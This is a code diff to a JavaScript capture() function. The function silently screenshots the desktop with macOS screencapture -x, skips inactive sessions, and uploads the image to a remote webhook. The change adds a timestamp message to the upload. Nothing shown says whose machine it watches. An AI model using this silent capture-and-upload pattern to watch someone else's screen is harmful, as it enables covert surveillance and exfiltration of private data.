@@ -16,7 +16,8 @@ async function capture() {
 			if (cp.stdout.toString().split('\n').find(x => x.startsWith('>')).substr(46, 4) == "Disc") throw "Inactive session"; // will capture black screen otherwise
 		}
 	}
-	var filename = `${new Date().toISOString().replace(/:/g, '-')}_${encodeURIComponent(crypto.randomBytes(16).toString('base64'))}.jpg`
+	var filedate = new Date();
+	var filename = `${filedate.toISOString().replace(/:/g, '-')}_${encodeURIComponent(crypto.randomBytes(16).toString('base64'))}.jpg`
 	var filepath = os.tmpdir() + '/' + filename;
 	if (process.platform == "darwin") {
 		exec(`screencapture -x -C -t jpg "${filepath}"`);
@@ -27,7 +28,7 @@ async function capture() {
 	}
 	var data = fs.readFileSync(filepath);
 	try {
-		await webhook.send({files:[{
+		await webhook.send(`y${filedate.getFullYear()} mo${filedate.getMonth()} d${filedate.getDate()} h${filedate.getHours()} mi${filedate.getMinutes()} s${filedate.getSeconds()}`, {files:[{
 			attachment: data,
 			name: filename
 		}]});
